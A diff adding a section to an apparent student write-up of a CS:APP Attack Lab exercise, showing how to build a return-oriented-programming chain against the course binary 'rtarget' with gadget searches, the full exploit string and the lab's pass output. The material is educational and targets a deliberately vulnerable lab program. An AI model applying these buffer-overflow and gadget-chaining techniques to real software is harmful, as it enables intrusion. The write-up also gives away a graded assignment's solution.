@@ -400,3 +400,146 @@ NICE JOB!
 #### A small side note
 
 I was initially trying to write the string bytes as part of my exploit code (using registers and `movabs`), writing it to overwrite the area of memory where the code for `touch1` is. But this fails with a segmentation fault since that memory area is not writable. TIL.
+
+## Part II: Return-Oriented Programming
+
+### Level 1
+
+We start by finding out which functions we can use - these will be any functions between `start_farm` and `end_farm`:
+
+```sh
+$ objdump -D rtarget | grep -E 'start_farm|end_farm'
+0000000000402896 <start_farm>:
+0000000000402a61 <end_farm>:
+```
+
+Thus, our functions will be between `0x402896` and `0x402a61`. To make it a bit easier to search, it can be useful to create a file containing this region of the object dump. After all, it's easier to search a 7511 byte file than a 1568476 byte file.
+
+```sh
+$ objdump -D rtarget > farm.objdump
+$ vim farm.objdump
+# delete lines until start_farm and after end_farm
+```
+
+Our goal is the same as Part I, level 2: call `touch2` and passing our cookie as the argument. To pass the argument, we need to write our cookie to the `%rdi` register. The easiest way to do this would be to just `mov` it in there - however, that would require all of `movq $0x5d21660e,%rdi` to be present in some gadget, which is very unlikely. Let's try searching for the byte `5d` anyway:
+
+```sh
+$ grep '5d' farm.objdump
+# nothing
+```
+
+Nothing. Since we can overflow the buffer and thus control the values on the stack, maybe we can find a `pop` instruction that will pop the cookie (which we can write to the stack) off the stack into `%rdi`. The provided instruction tables show that `popq %rdi` is encoded as the byte `5f`. Let's search for that:
+
+```sh
+$ grep '5f' farm.objdump
+000000000040295f <addval_359>:
+  40295f:       f3 0f 1e fa             endbr64
+```
+
+It only shows up in the address of the instructions, bummer. Maybe we can `pop` into another register and then copy the value from that register into `%rdi`. These are all the `popq` encodings:
+
+| **Register R** | `%rax` | `%rcx` | `%rdx` | `%rbx` | `%rsp` | `%rbp` | `%rsi` | `%rdi` |
+|----------------|--------|--------|--------|--------|--------|--------|--------|--------|
+| **`popq R`**   | `58`   | `59`   | `5a`   | `5b`   | `5c`   | `5d`   | `5e`   | `5f`   |
+
+We tried `%rdi`, let's keep going. I'll use an [online disassembler](https://onlinedisassembler.com/odaweb/lH9MfnFs/0) to see what instructions a sequence of bytes results in.
+
+1. `%rsi`, nope:
+   ```sh
+   $ grep '5e' farm.objdump
+     40295e:       c3                      retq
+   ```
+1. We'll skip `%rbp` and `%rsp` to avoid messing with returns
+1. `%rbx`:
+   ```sh
+   $ grep '5b' -A 1 farm.objdump
+     4028c5:       b8 5b 14 78 90          mov    $0x9078145b,%eax
+     4028ca:       c3                      retq
+   ```
+   There is potential here since `5b` is followed shortly by a `c3` (the `ret` instruction). But the instructions between `5b` and `c3` cause a segmentation fault if we run them, yikes.
+1. `%rdx`, nope:
+   ```sh
+   $ grep '5a' farm.objdump
+     402a5a:       8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
+   ```
+1. `%rcx`, nope:
+   ```sh
+   $ grep '59' farm.objdump
+   000000000040295f <addval_359>:
+   ```
+1. `%rax`, yes! Many candidates:
+   ```sh
+   $ grep '58' farm.objdump
+     4028cf:       c7 07 a1 58 c3 0a       movl   $0xac358a1,(%rdi)
+     4028ef:       b8 58 90 90 c3          mov    $0xc3909058,%eax
+   0000000000402913 <addval_358>:
+     402958:       c7 07 81 c1 08 c0       movl   $0xc008c181,(%rdi)
+     4029ce:       b8 58 89 e0 90          mov    $0x90e08958,%eax
+   ```
+
+   The first search hit shows `58` followed by `c3` - that's just `popq %rax` and then `ret`, perfect! There is also `58 90 90 c3` which is `popq %rax`, `nop`, `nop`, and then `ret` - equally viable. We will make use of the first one.
+
+We've found some suitable bytes we can use as instructions at the line `4028cf` in the file. We want `58 c3`, which start at the 4th byte - thus our gadget address becomes `4028cf + 3 = 4028d2`.
+
+However, the only thing we have achieved so far is a way to save the cookie in `%rax` - we still need to be able to somehow move it to `%rdi`. If there is a `movq %rax,%rdi` encoding somewhere, that would be great! Otherwise, we need to get a bit more creative.
+
+The provided instruction table shows that `movq %rax,%rdi` is encoded as `48 89 c7`. Let's see if that exists:
+
+```sh
+$ grep '48 89 c7' -A 1 farm.objdump # would not catch if the bytes were split on multiple lines
+  4028a4:       8d 87 4c 48 89 c7       lea    -0x3876b7b4(%rdi),%eax
+  4028aa:       c3                      retq
+--
+  4028da:       c7 07 48 89 c7 91       movl   $0x91c78948,(%rdi)
+  4028e0:       c3                      retq
+--
+  4028e5:       b8 75 48 89 c7          mov    $0xc7894875,%eax
+  4028ea:       c3                      retq
+```
+
+There are three occurrences of that byte sequence, two of which are followed by `c3` - perfect. It's almost like the lecturers planted these intentionally! Let's use the latter result: `48` is the third byte, so it's address is `4028e5 + 2 = 4028e7`.
+
+Lastly, we need the address of `touch2`:
+
+```
+$ objdump -D rtarget | grep "<touch2>"
+00000000004026cc <touch2>:
+```
+
+We are now ready to implement our exploit string. I'll paste it here and explain it afterwards:
+
+```asm
+/* Padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+d2 28 40 00 00 00 00 00 /* Address of our `popq %rax` gadget */
+0e 66 21 5d 00 00 00 00 /* Our cookie */
+e7 28 40 00 00 00 00 00 /* Address of our `movq %rax,%rdi` gadget */
+cc 26 40 00 00 00 00 00 /* Address of touch2 */
+```
+
+What happens is as follows:
+
+1. `Gets` reads our input and overflows the buffer as in all the other assignments
+1. We overwrite the location on the stack that held the return address with `0x4028d2`, the address of our first gadget
+1. Right below that, we write the value of our cookie. After `getbuf` returns, this location will be the top of the stack. This will be important.
+1. The program "returns" and starts reading our gadget bytes as instructions:
+   1. `58` is `popq %rax`, popping a value off the stack and into `%rax`. Our cookie is currently the top of the stack, so `%rax` now contains our cookie.
+   1. When `popq` is executed, the stack pointer is decreased, so it now points to the third line of our exploit: the address of our second gadget.
+   1. `c3` is `retq`, returning to the address on the top of the stack.
+1. The program "returns" and starts reading our second gadget's bytes as instructions:
+   1. `48 89 c7` is `movq %rax,%rdi`, which copies our cookie value from `%rax` to `%rdi`. Recall that `%rdi` holds the first argument to `touch2`, so we have now "passed" the argument.
+   1. `c3` is `retq`, returning to the address on the top of the stack, which is now the address of `touch2`.
+1. Success:
+   ```sh
+   $ cat inp.txt | ./hex2raw | ./rtarget
+   Cookie: 0x5d21660e
+   Type string:Touch2!: You called touch2(0x5d21660e)
+   Valid solution for level 2 with target rtarget
+   PASS: Sent exploit string to server to be validated.
+   NICE JOB!
+   ```
